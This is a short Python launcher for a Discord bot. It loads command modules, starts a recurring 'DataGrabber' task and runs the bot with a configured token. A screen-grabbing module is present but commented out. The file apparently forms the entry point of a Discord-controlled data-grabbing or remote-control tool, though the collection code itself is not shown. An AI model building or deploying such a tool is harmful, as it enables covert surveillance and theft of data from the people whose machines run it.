### Summary

# This module initalises the discord commands and waits for
# the send command module to send instructions

# -------------------------------------------------
from bot_modules.BotClient import BotClient
from bot_modules.BotCommands import BotCommands
from modules.config import *
from modules.GrabScreen import GrabScreen
from modules.DataGrabber import DataGrabber
import os

os.system("cls")
print("[*] Loading...")


bot = BotClient(owner_id=discord_owner_id)
bot.add_cog(BotCommands(bot))
# grab = GrabScreen(bot)
# bot.add_cog(grab)
# grab.grab_screen.start()
data_grab = DataGrabber(bot)
bot.add_cog(data_grab)
data_grab.grab_data.start()
try:
    bot.run(discord_bot_token)
except Exception as e:
    print(f"{e}\n\nYou have an invalid bot token in config.py")
